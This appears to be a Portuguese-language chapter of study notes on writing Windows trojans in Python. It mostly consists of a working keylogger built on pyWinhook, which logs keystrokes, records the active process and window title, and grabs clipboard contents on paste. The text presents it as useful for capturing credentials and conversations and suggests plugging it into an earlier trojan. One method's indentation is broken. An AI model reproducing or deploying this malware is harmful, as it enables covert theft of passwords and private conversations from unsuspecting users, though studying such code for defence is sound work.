# Capitulo 8 

Nesse capítulo são abordadas tarefas comuns de se realizar em um sistema Windows.

## Tarefas comuns de trojans no Windows

Vamos explorar alguns métodos de captura de informações de alvos neste capítulo, direcionados ao Windows. Exemplos comuns são:

- Keylogging: identificação de pressionamento de teclas no teclado
- Screenshots: capturas de tela em momentos específicos pelo usuário
- Shellcode: execução de comandos shell no computador da vítima

É importante que, para realizar os testes, o alvo seja bem modelado para evitar erros em alvos reais.

### Keylogging para captura de pressionamento de teclas

Você pode ler mais sobre keylogging a partir da [internet](https://pt.wikipedia.org/wiki/Keylogger), mas basicamente é o que foi escrito anteriormente: um método de captura de inputs do teclado que é muito útil para captura de credenciais e de conversas.

Os autores mencionam a existência de uma biblioteca chamada [PyWinHook](https://pypi.org/project/pyWinhook/), que é uma adaptação da biblioteca [PyHook](https://pypi.org/project/pyHook/) para o Python 3. Ela utiliza uma função do Windows chamada `SetWindowsHookEx`, que permite a utilização de funções arbitrárias em determinados eventos do Windows. Finalmente, a lib também permite sabermos qual processo está executando as teclas, o que ajuda a desvendar o software em que são usadas as senhas/credenciais eventualmente digitadas.

Para instalar a lib:

```bash
pip install swig
pip install pywinhook
```

Caso não dê certo instalar, experimente:

1. Desligar e ligar a máquina
2. Rodar no VENV a instalação e em seguida rodar no terminal normal

Falando sobre os *Hooks*, eles são nada mais que técnicas de modificação de um determinado sistema operacional/software pela interceptação de chamadas de função/mensagens/eventos entre os componentes de software.

Deixemos que o PyWinHook cuide do baixo nível para nós. Criaremos o arquivo `keylogger.py`:

```py
# Vamos lá, isso vai ser complicadinho para que não manja de Windows
# Lembra da ctypes? Usamos ela para converter os valores de variáveis em Python para C/C++
# Nesse caso, usaremos algumas funções do C/C++ para se comunicar com os dados do Windows
# byref é uma referencia a um ponteiro Windows (usada para apontar processos) para que o ponteiro seja modificado durante a chamada
# create_string_buffer cria um buffer de memória para armazenar string, serve para receber dados
# c_ulong é a variável em C para unsigned long
# windll é o módulo de inferface com as dlls do Windows. Serve para chamar funções nativas, por exemplo,
# user32 ou kernel32, que chama funções ao nível de usuário e ao nível de OS
from ctypes import byref, create_string_buffer, c_ulong, windll 
from io import StringIO # uso de strings input/output

import os
 # O pythoncom é um módulo do pacote pywin32 que fornece funcionalidades para interagir com o COM 
 # (Component Object Model) no Windows. O COM é uma tecnologia da Microsoft que permite a criação 
 # de componentes reutilizáveis e a comunicação entre aplicações ou bibliotecas de forma 
 # independente de linguagem.
import pythoncom    
import pyWinhook as pyHook # hoks
import sys
import time
# O win32clipboard é um módulo do pacote pywin32 que permite interagir com a área de transferência 
# do Windows (clipboard). Ele fornece funcionalidades para copiar, colar e manipular dados 
# diretamente no clipboard, incluindo texto, imagens e outros formatos suportados pelo sistema.
import win32clipboard

TIMEOUT = 60*10

# Classe do Keylogger
class Keylogger:
    def __init__(self):
        self.current_window = None  # nome da janela atual, usada para saber onde os inputs de teclado vão
        
    def get_current_process(self):
    # Obtém o identificador da janela atualmente em foco no sistema.
    hwnd = windll.user32.GetForegroundWindow()  
    
    # Cria uma variável para armazenar o ID do processo (PID) associado à janela em foco.
    pid = c_ulong(0)
    # Preenche o PID do processo associado à janela ativa usando o identificador `hwnd`.
    windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
    # Converte o valor do PID para uma string para facilitar o uso posterior.
    process_id = f'{pid.value}'
    
    # Cria um buffer para armazenar o nome do executável associado ao processo.
    executable = create_string_buffer(512)
    # Abre o processo associado ao PID para obter informações adicionais sobre ele.
    # O acesso especificado (0x400 | 0x10) permite ler informações básicas sobre o processo.
    h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
    
    # Obtém o nome do executável associado ao processo usando a API do Windows.
    windll.psapi.GetModuleBaseNameA(
                h_process, None, byref(executable), 512)
    
    # Cria um buffer para armazenar o título da janela atualmente em foco.
    window_title = create_string_buffer(512)
    # Obtém o título da janela associada ao identificador `hwnd`.
    windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
    
    try:
        # Tenta decodificar o título da janela para armazená-lo em `self.current_window`.
        # Isso pode falhar se o título contiver caracteres que não podem ser decodificados.
        self.current_window = window_title.value.decode()
    except UnicodeDecodeError as e:
        # Em caso de erro de decodificação, exibe uma mensagem e define o título como desconhecido.
        print(f'{e}: nome da janela desconhecido')
        
    # Imprime as informações coletadas: PID, nome do executável e título da janela.
    print('\n', process_id, executable.value.decode(), self.current_window)
    
    # Fecha os identificadores abertos para a janela (`hwnd`) e o processo (`h_process`)
    # para liberar recursos do sistema.
    windll.kernel32.CloseHandle(hwnd)
    windll.kernel32.CloseHandle(h_process)
```

Ufa! Meio complicadinho, mas vamos seguindo...

O código acima serve somente para saber qual a janela ativa no momento. Agora implementaremos, de fato, o keylogger:

```py
    # mykeystroke na verdade recebe os eventos de input do teclado
    def mykeystroke(self, event): 
            if event.WindowName != self.current_window: # se, na classe atual do Keylogger,
                                                        # a dada janela dele não for atual, atualiza a janela
                self.get_current_process()
            if 32 < event.Ascii < 127:
                print(chr(event.Ascii), end='')         # se os caracteres do evento forem uma sequencia de ASCII, printa eles
            else:
                if event.Key == 'V':                    # Sempre que houver uma tecla "V" maiuscula (podendo ser Ctrl-V), usa o clipboard
                    win32clipboard.OpenClipboard()      # para capturar o que está salvo lá
                    value = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    print(f'[PASTE] = {value}')         # printa o que foi colado
                    
                else:   
                    print(f'\n{event.Key}')               # se não for ascii, printa a tecla normalmente
                    
            return True
        
def run():
    save_stdout = sys.stdout    # salva o buffer a ser printado
    sys.stdout = StringIO()     # cria com StringIO um buffer para ser usado para output. Essa lib também é usada para simular um arquivo
    kl = Keylogger()            # inicia o keylogger
    hm = pyHook.HookManager()   # inicia o manager dos Hooks que interpretará os eventos de teclado
    hm.KeyDown = kl.mykeystroke # coloca para que todo hook de pressionamento de tecla seja usado como evento no mykeystroke
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages() # pythoncom.PumpWaitingMessages() vem da lib do Windows e serve para aguardar uma fila de eventos
                                        # mais ou menos como uma forma de sempre ler todos os eventos, processando os eventos pendentes em ordem.
    log = sys.stdout.getvalue()         # pega o buffer de stdout
    sys.stdout = save_stdout            # salva-o antes do próximo run
    return log

if __name__ == '__main__':
    print(run())
    print('Concluido')
```

Pronto! Agora você tem um código de keylogger funcional!

### Explorando o código

Bom, agora você tem o keylogger. Você pode acioná-lo aos módulos do trojan do Capítulo 7 e pode mudar o TIMEOUT para que ele execute em determinado tempo.